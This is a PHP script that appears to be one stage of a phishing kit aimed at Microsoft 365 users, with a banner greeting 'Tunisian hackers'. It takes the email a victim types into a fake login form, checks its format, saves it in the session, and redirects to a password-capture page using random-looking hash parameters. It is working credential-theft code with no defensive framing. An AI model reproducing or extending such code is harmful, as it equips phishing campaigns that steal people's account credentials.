<?php
/*
***********************************************************
*                                                         *
*                                                         *
*             E-success                                   *
*                                                         *
*             GR33TZ TO TUNISIAN HACKERS                  *
*                                                         *
***********************************************************
*/
session_start();
require "../FUNC/One_Time.php";
$email= $_POST['emailo365'];
	if ( ( !$email ) ||
		 ( strlen($_POST['customer[email]']) > 35 ) ||
	     ( !preg_match("#^[A-Za-z0-9](([_\.\-]?[a-zA-Z0-9]+)*)@([A-Za-z0-9]+)(([\.\-]?[a-zA-Z0-9]+)*)\.([A-Za-z]{2,})$#", $email) )
       )
	{
		header('Location: ../Home?False='.md5(microtime()));
		exit;
	}
$_SESSION['_USER_']=$_POST['emailo365'];
header("Location: ../passornot/?=".$_SESSION['_L']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>